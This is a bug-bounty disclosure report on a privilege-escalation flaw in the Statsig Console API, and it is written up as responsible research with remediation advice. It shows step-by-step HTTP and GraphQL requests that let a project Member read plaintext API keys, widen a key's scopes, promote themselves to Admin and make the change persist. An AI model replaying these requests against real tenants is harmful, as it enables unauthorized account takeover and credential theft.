# Statsig Console — `/console/v1` authorizes by API-key CLASS, not by the caller's role: a project **Member** holding/rewriting a company-scoped key promotes itself to **Admin**

**Target Location:** Statsig
**Target category:** Web App
**VRT (suggested):** Broken Access Control (BAC) > Privilege Escalation — CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = **8.8 (High)**, with the measured caveat that Availability impact is partial in practice (see Ceiling), so P1/P2 boundary is the triager's call.

---

**Affected Asset:** `https://statsigapi.net/console/v1/*` (management REST API behind `STATSIG-API-KEY`) and `https://console.statsig.com/api/graphql` (key-management mutations: `CreateSDKKey`, `UpdateSDKKeyScopes`, `DeactivateSDKKey`). Affected routes measured: `/console/v1/users`, `/console/v1/users/{email}`, `/console/v1/settings/roles`, `/console/v1/roles`, `/console/v1/roles/{id}`, `/console/v1/settings/reviews`, `/console/v1/settings/teams`, `/console/v1/unit_id_types`, `/console/v1/target_app`, `/console/v1/keys`.

**Summary:**

The Statsig Console management API resolves the **credential** and never the **caller**. A `/console/v1` request is authorized by two properties of the API key that signs it — its **class** (a company-scoped `CONSOLE` key with `owner: null` is accepted; a `SERVER`/`CLIENT` key is refused by type; a read-only-scoped key is refused by scope) — and never by the **role of the human** who obtained or is using it. The API accepts a company-scoped `CONSOLE` key from a plain **Member** who has no right to hold it, lets that Member rewrite the key's scopes through an ungated mutation, and then treats the rewritten key as admin-equivalent. Chained, the lowest administrative role promotes itself to **Admin**.

The product clearly knows how to build each individual gate, because two of the three exist and work: a key-type gate (`"This endpoint only accepts an active CONSOLE key, but a SERVER key was sent."`) and a key-scope gate (`"Read only API keys can not modify entities"`). What is missing is the third: nothing checks the role of the human behind the key. Measured consequence: the same key **value** returns `401 "Read only API keys can not modify entities"` while its scope is `["omni_read_only"]` and `201` on the same write once the Member has raised the scope to `["omni_read_write","can_access_keys"]` — the scope write itself being the one key mutation (`UpdateSDKKeyScopes`) that, unlike `CreateSDKKey` and `DeleteSDKKey` on the same object, carries no `"Must be admin of project"` gate.

A fresh end-to-end reproduction was run on **2026-10-17** in the researcher-owned project `4n6HCY59mDqwX1iSZQtNvx`: the Owner minted a company-scoped `CONSOLE` key (`id 2zBljx822Kbq7SdFaBPVv7`, scopes `["omni_read_write"]`, `owner: null`); the project **Member** read its plaintext value from the GraphQL key-box query the console UI denies them (tooltip: *"Contact Project Admin to View Key"*); the Member then called `POST /console/v1/users/{self}` with `{"role":"Admin"}` signed by that key → **`201 Created`**, and the roster read-back showed the Member as `admin`. Everything was reverted and verified. Measured on a permission matrix across that project, the two real deltas a company-scoped key gives a Member are exactly: **(1) plaintext key values** (UI tooltip denies it; the API returns them) and **(2) role change incl. self-promotion to Admin** (personal key on the same call: `400`; company key: `201`). Roster reads, audit-trail reads and gate creation are **parity** — the Member's own browser session already does those — and no capability beyond parity is claimed for them.

**Steps to Reproduce:** *(performed on my own tenant — two researcher-owned projects, `4n6HCY59mDqwX1iSZQtNvx` and `4IM7HTtUKEEctrmIy6IrJm` — every change reverted and verified; no third-party data touched)*

1. **Owner mints a company-scoped CONSOLE key** (project `4n6HCY59mDqwX1iSZQtNvx`, 2026-10-17). `CreateSDKKey` with `scopes:["omni_read_write"]`, `owner_id: null` → key `2zBljx822Kbq7SdFaBPVv7`, `owner: null`. *(Measured on the same tenants: a Member cannot perform this step — `CreateSDKKey` as Member → `"Must be admin of project"`; and a personal key cannot be granted `omni_*` scopes — `"Scopes: Invalid scopes: omni_read_write"`.)*
2. **Member reads the key in plaintext.** As the project Member (`mohamed-9499-3@agentmail.to` class account in the second tenant; same pattern in this one):
   ```
   POST /api/graphql?company_id=<COMPANY_ID> HTTP/1.1
   Host: console.statsig.com
   Cookie: <MEMBER SESSION>
   x-csrf-token: 1

   {"id":"d6fcaacbc921668f7e7aa576b9d2ca1e","variables":{"first":100,"keyType":"ALL"}}
   ```
   ```
   HTTP/1.1 200 OK
   {"data":{"viewer_company":{"keys_connection":{"nodes":[
     {"id":"2zBljx822Kbq7SdFaBPVv7","type":"CONSOLE","owner":null,
      "scopes":["omni_read_write"],"value":"console-…"},   <- plaintext, UI denies this
     {"id":"4n6Qh4Fw4smWU499JM5sWH","type":"SERVER","value":"secret-…"},
     {"id":"4n6Qh7ZAZ2FVwTf0W1WJyL","type":"CLIENT","value":"client-…"}]}}}}
   ```
   2026-10-17 measurement: the box query returned the company key (`valuelen 51`), the SERVER key (50) and CLIENT key (50) in plaintext; the same value was also returned by the onboarding operation (`63df72f6…` → `secret_keys`) and by `/personal_capi_token` rows (`capi_rows`). A project does **not** get a company-scoped CONSOLE key by default (measured: box empty at baseline, `n = 0`) — the precondition for the chain is exactly that one such key exists, and its scope need only be `["omni_read_only"]` because step 3 rewrites it.
3. **Member rewrites the key's scopes — no admin gate.** As the read-only key itself, writes are correctly refused: `POST /console/v1/users/<member> {"role":"Member"}` → `401 {"message":"Read only API keys can not modify entities"}`. But the scope of that same key is rewritable by the Member's browser session:
   ```
   POST /api/graphql?company_id=<COMPANY_ID> HTTP/1.1
   Host: console.statsig.com
   Cookie: <MEMBER SESSION>
   x-csrf-token: 1

   {"id":"ee6fa2efc62906060e04a4e788bc4ac0",
    "variables":{"id":"3Be7ZcASE0mePuQOULbYeC",
                 "scopes":["omni_read_write","can_access_keys"],"version":1}}
   ```
   ```
   HTTP/1.1 200 OK
   {"data":{"update_sdkkey":{"update_sdkkey_scopes":{"id":"3Be7ZcASE0mePuQOULbYeC",
      "scopes":["omni_read_write","can_access_keys"],"version":2}}}}
   ```
   On the same key object: `CreateSDKKey` → `"Must be admin of project"`, `DeleteSDKKey` → `"Must be admin of project"`, **`UpdateSDKKeyScopes` → `200`**, `DeactivateSDKKey` → `200`.
4. **The same key now promotes the Member to Admin** (fresh repro, 2026-10-17, project `4n6HCY59mDqwX1iSZQtNvx`):
   ```
   POST /console/v1/users/<MEMBER'S OWN EMAIL> HTTP/1.1
   Host: statsigapi.net
   STATSIG-API-KEY: console-…2zBljx822Kbq7SdFaBPVv7
   Content-Type: application/json

   {"role":"Admin"}
   ```
   ```
   HTTP/1.1 201 Created
   {"message":"User updated successfully.","data":{…}}
   ```
   ```
   GET /console/v1/users HTTP/1.1
   Host: statsigapi.net
   STATSIG-API-KEY: console-…2zBljx822Kbq7SdFaBPVv7
   ```
   ```
   HTTP/1.1 200 OK
   … {"email":"<MEMBER EMAIL>","role":"admin"} …   <== THE MEMBER IS NOW AN ADMIN
   ```
   `GET /console/v1/users` → `200`, `GET /console/v1/company` → `200`, `GET /console/v1/keys` → `403` before the scope write → `200` after it. The same key then also writes `POST /console/v1/settings/roles {"default_project_role":"Admin"}` → **`201 Created`** (persistence step, step 6).
5. **Personal-key control on the identical call (2026-10-17, same project, same Member):** `POST /console/v1/users/{self} {"role":"Admin"}` signed by the Member's **personal** key → **`400 {"message":"Must be admin of project or project org"}`**. The same call signed by the company-scoped key → `201`. This is the differential that isolates the defect to key **class** — and it proves personal keys **cannot** escalate (see Controls).
6. **Persistence:** `POST /console/v1/settings/roles {"default_project_role":"Admin"}` (company key) → `201 {"message":"Settings updated successfully.","data":{"default_project_role":"Admin"}}`. Every future invitee lands as Admin, so the escalation outlives removal of the offending account. The audit trail records no person: `"updatedBy": "CONSOLE API - console-…"`, `"updatedByUserID": "<key id>"`, `"modifierEmail": null`.
7. **Revert (all verified):** role restored to `member` (roster read-back confirmed), key scopes restored to `["omni_read_only"]`, default role restored, company key deleted, key box back to baseline (`final_box: []`, `cleanup_ok: true` in the run summary).

**Impact:**

* A plain **Member** ends up holding the project's highest effective role — no approval, no notification, no human actor in the audit trail.
* Before that, the same session exposes **every key in the project in plaintext** (the company `CONSOLE` key, the production `SERVER` key, the `CLIENT` key).
* The escalation persists via the default-role change, and the credential's authority does not track any human's role: the company-scoped key has `owner: null` and kept working (`201` on the promote) while the account using it was a plain Member. Demoting or removing the human who used it does not revoke what it can do — only deleting the key does.
* Blast radius (same class-rule, 2026-10-17 matrix, company-scoped vs personal key of the same Member):

  | Call | company-scoped key | personal key |
  |---|---|---|
  | `GET /console/v1/users` | `200` | `200` (parity) |
  | `GET /console/v1/company` | `200` | `200` (parity) |
  | `GET /console/v1/audit_logs` | `200` | `200` (parity) |
  | `POST /console/v1/settings/roles` | **`201`** | `400 "Must be admin of project"` |
  | `POST /console/v1/users/<any> {"role":"Admin"}` | **`201`** | `400 "Must be admin of project or project org"` |
  | `POST /console/v1/roles` | **`201`** | `400` |
  | `PATCH /console/v1/roles/{id}` | **`200`** | `400` |
  | `POST /console/v1/settings/reviews` | **`201`** | `400` |
  | `POST /console/v1/settings/teams` | **`201`** | `400` |
  | `POST /console/v1/unit_id_types` | **`201`** | `400` |
  | `GET /console/v1/keys` | `403` → `200` after scope write | `403` |

  Reads are clean: across 66 read operations in `experiments`, `gates`, `metrics`, `segments`, `layers`, `holdouts`, `dashboards`, `alerts`, the status pair is identical for both key classes — the defect is directional and bounded to **writes on admin-gated resources**. The write-side reach is sharpest on `POST /settings/reviews` (the project's approval policy — a credential the Member should not hold can weaken the workflow that would otherwise stop them) and on role definitions (`create_configs`, `edit_or_delete_configs`, `launch_to_production`, `create_teams`, `invitation_access` accepted).

**Controls (what bounds this):**

* **Personal keys cannot escalate — proven.** A personal key (`owner` set, what `/personal_capi_token` produces) is capped on every path: `POST /console/v1/users/{self} {"role":"Admin"}` → `400`, `POST /console/v1/settings/roles` → `400 "Must be admin of project"`, and `UpdateSDKKeyScopes` refuses it the `omni_*` scope family outright (`"Scopes: Invalid scopes: omni_read_write, can_access_keys"`; read-back unchanged). A Member also cannot mint a company-scoped key (`CreateSDKKey` → `"Must be admin of project"`; `POST /console/v1/keys` with `owner_id:null` via personal key → `403 "Insufficient permissions."`).
* The key-type gate works: `SERVER` and `CLIENT` keys are refused on `/console/v1` (`403 "This endpoint only accepts an active CONSOLE key, but a SERVER/CLIENT key was sent."`). So the exposure is specifically the company-scoped CONSOLE tier.
* A company-scoped key as issued with `["omni_read_only"]` is refused on every write by the scope gate — until the Member rewrites its scope (the `200` mutation this report is about).
* **Ceiling — what the promoted Admin cannot do:** against the original **Owner**, `POST /console/v1/users/<owner> {"role":"Member"|"Read Only"}` returns `201` but the role is **unchanged** (silent no-op); `POST /console/v1/users/{self} {"role":"Owner"}` → `401 "Must be owner of project"`. The ceiling is full Admin authority over every other member, project settings, the administrative record and (with the `can_access_keys` scope step 3 grants) other credentials — **not** ownership. Also noted: the refused role changes returned `201` and wrote audit entries although nothing changed.

**Why this is not a duplicate of the already-filed reports:**

* **vs `e103ef0a` (filed — the READ defect):** `e103ef0a` is the **disclosure**: a Member's GraphQL key-box query returns plaintext key values the UI tooltip denies. It is a read on the console session plane and it claims no write, no scope mutation and no privilege change. This report is the **authorization defect on the management API**: `/console/v1` authorizes by key CLASS (company-scoped CONSOLE accepted / personal refused) and never by the caller's role, enabling scope self-escalation and self-promotion to Admin. The plaintext read (e103ef0a's object) appears here only as **step 2 — the precondition** that hands the Member the credential; the defect demonstrated is what the API then lets that Member **do** with it (the 400-vs-201 differential on `POST /console/v1/users/{self}`). Different plane (REST management API vs GraphQL read), different object (authorization decision vs data exposure), different fix (role gate on `/console/v1` vs masking predicate on the `SDKKey.value` resolver). Closing this as a duplicate of e103ef0a would leave the entire write/escalation chain unaddressed.
* **vs `8d4a107f` (filed, two parts):** Part 1 covers **create-side setting enforcement** (what settings govern key creation); Part 2 covers the **Read-Only READ path** (what a read-only-scoped key can read). Neither part demonstrates a **write** path, a scope mutation, or a role change. This report is the **WRITE path with a company-scoped key**, and the 2026-10-17 measurement is the separation test in one row: on the identical call `POST /console/v1/users/{self} {"role":"Admin"}`, the **personal key returns `400`** while the **company-scoped key returns `201`** — measured 2026-10-17 in project `4n6HCY59mDqwX1iSZQtNvx`, same Member, same day, same call. 8d4a107f's read-only-key material is cited here only as the *negative control* that shows the scope gate exists and is exactly the gate the `UpdateSDKKeyScopes` mutation bypasses. No overlap in the demonstrated defect, and the fix differs (admin gate on `UpdateSDKKeyScopes` + caller-role check on `/console/v1` writes vs whatever 8d4a107f's parts remediate).
* **Folding test:** if the program prefers to treat "the Console API resolves the credential, not the caller" as one root cause spanning these IDs, then this report is the **impact escalation** of that root (Member → Admin, durable via default-role) and should absorb rather than be absorbed — no other filed report states the 400/201 differential, the `UpdateSDKKeyScopes` gate asymmetry, or the `settings/roles` persistence.

**Remediation:**

1. **Check the caller's role, not only the key class.** Every `/console/v1` write route should resolve the human behind the credential and evaluate their role against the action, exactly as the console session path already does. The key-type and key-scope gates show the pattern is understood; the role gate is the missing third one.
2. **Put the admin gate on `UpdateSDKKeyScopes` and `DeactivateSDKKey`** to match `CreateSDKKey` and `DeleteSDKKey` on the same object. A credential must not be able to widen its own authority.
3. **Clamp scopes to the owner's role:** never allow a key to gain a scope its holder's role does not permit (intersect requested scopes with what the holder may hold).
4. **Apply the existing Read-Only masking predicate to role < Admin** on the `SDKKey.value` resolver and its siblings (`ApiKeysBoxQuery` `d6fcaacb…`, `PersonalCAPITokenSectionQuery` `0799d4b7…`, onboarding query `63df72f6…`) so a Member cannot read the value that starts the chain.
5. **Re-evaluate authority on every call** so demoting or removing a user immediately removes what their credentials represent; and stop writing audit rows (with `201`) for role changes that did not take effect.

**Evidence to attach:**

* `hunt2610/triage-e103ef0a/summary.json` — 2026-10-17 fresh repro: company `4n6HCY59mDqwX1iSZQtNvx`, key `2zBljx822Kbq7SdFaBPVv7` (`owner: null`, `["omni_read_write"]`), box/capi plaintext lens counts, `rest_company_status 200`, `rest_users_status 200`, `cleanup_ok: true`.
* `hunt2610/triage-e103ef0a/member_permission_matrix.json` — the permission matrix (roster/audit/gates = parity; plaintext key values + role-change = the two real deltas; personal key `400` vs company key `201`; final box empty after revert).
* `escal/user_key_scope_20260920T*.json` — the chain against the Member's own read-only key: as-is `401`, scope write `200`, then `GET /keys 403 → 200` and `POST /users {"role":"Admin"} → 201`, scope restored.
* `escal/user_tenant_chain_20260920T*.json` — same chain end-to-end in the second tenant.
* `escal/fullchain_20260919T*.json`, `escal/company_key_reach_20260919T*.json`, `escal/leaked_key_test_20260920T*.json` — class-vs-personal matrix, key-type gate, server-key behaviour.
* `escal/personal_chain_20260919T*.json`, `escal/missing_link_20260919T*.json`, `escal/merge_test_20260919T*.json` — negative controls (personal key cannot escalate, cannot mint a company key, cannot change a role).
* `escal/REPRODUCTION-FULL.md`, `escal/BURP-REQUESTS.md` — copy-paste runbook and raw Burp requests.
* `hunt2610/final-taint/emailnorm_results.json` — 2026-10-17 parameter-taint pass: the role-change path accepted `URL-encoded @`, `UPPERCASE`, `trailing-dot` and **query-string-appended** (`{email}?x=1` → `201` and the roster role changed to `admin`) email shapes — the route parser strips the query component, so WAF/log parsers that split on `?` see a different path than the one the application routed. Owner protection held under every shape (silent no-op, role unchanged). No new privilege — recorded as parameter-handling hardening for this report's fix scope.
